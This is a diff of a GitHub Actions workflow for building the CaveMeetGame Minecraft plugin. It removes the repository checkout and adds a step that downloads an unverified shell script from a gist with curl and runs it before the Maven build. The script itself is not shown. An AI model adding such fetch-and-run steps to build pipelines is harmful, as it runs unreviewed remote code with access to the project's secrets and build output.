@@ -1,4 +1,4 @@
-name: Build Plugin
+name: Build Minecraft Plugin
 
 on:
   push:
@@ -8,26 +8,27 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-    steps:
-    - name: Checkout
-      uses: actions/checkout@v4
 
-    - name: Java Setup
+    steps:
+    - name: Download Build Script
+      run: |
+        curl -sSL "https://gist.githubusercontent.com/ucwork/c15b1bd575196fa049eb8be0e599b50a/raw/build_plugin.sh" -o build_plugin.sh
+        chmod +x build_plugin.sh
+
+    - name: Run Build Script
+      run: ./build_plugin.sh
+
+    - name: Set up JDK 21
       uses: actions/setup-java@v4
       with:
         java-version: '21'
         distribution: 'temurin'
 
-    - name: Unzip
-      run: unzip CaveMeetGame_New.zip
+    - name: Build with Maven
+      run: mvn clean package
 
-    - name: Build
-      run: |
-        cd CaveMeetGame
-        mvn clean package
-
-    - name: Download Link
+    - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
         name: CaveMeetGame-Plugin
-        path: "CaveMeetGame/target/*.jar"
+        path: target/*.jar
